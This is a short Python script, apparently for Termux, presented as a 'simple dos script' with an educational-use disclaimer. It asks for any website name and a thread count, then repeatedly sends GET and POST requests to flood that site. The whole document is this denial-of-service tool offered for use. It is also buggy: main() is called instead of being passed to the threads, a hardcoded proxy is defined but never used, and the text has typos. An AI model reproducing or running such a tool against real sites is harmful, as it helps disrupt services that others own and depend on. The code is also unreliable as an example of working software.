#!/data/data/com.termux/files/usr/bin/python3
#@Author : Prince kumar
# Date 16 dec 2020
# Description: Simple dos script
#Warning Only for educational and testing purposes
#Start 
						
#Import all requirements
import sys		
import requests
import os
import random
import time 
import threading
os.system('clear')
print("""
    \033[32;1m                             
                             
  ____  ____ ____ ___  _ _ _ 
 / _  |/ ___) ___) _ \| | | |
( ( | | |  | |  | |_| | | | |
 \_||_|_|  |_|   \___/ \____|
              		     \033[33;1m Made by prince
               
""")
host = input("\033[31;1m[\033[33m+\033[31;1m]\033[36m Enter a website name: ")
print("")
def get_useragent():
	header={
	'User-Agent': "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    'Cache-Control': 'no-cache',
    'Connection':"keep-alive"
	}
#
	return header
# Set a proxy
def get_proxy():
	proxy ={
	'https': "183.220.145.3:80"
	}
	#print("\033[33;1mSetting proxy..")
	return proxy

#define simple 
def s_Requests(url, header, proxy):
	r = requests.get(url, headers=header, timeout=6)
	p = requests.post(url, headers=header, timeout=6)

# Make a main function___
def main():

	s_Requests(host, get_useragent(), get_proxy())
	print("\033[31;1m[\033[38m!\033[31m]\033[34;1m Attaking")
num = input("\033[36;1m[\033[31m+\033[36m]\033[33;1mNo of Thraed: ")
for i in range(int(num)):
	t1 = threading.Thread(main())
	t2 = threading.Thread(main())
	t1.start()
	t2.start()
	
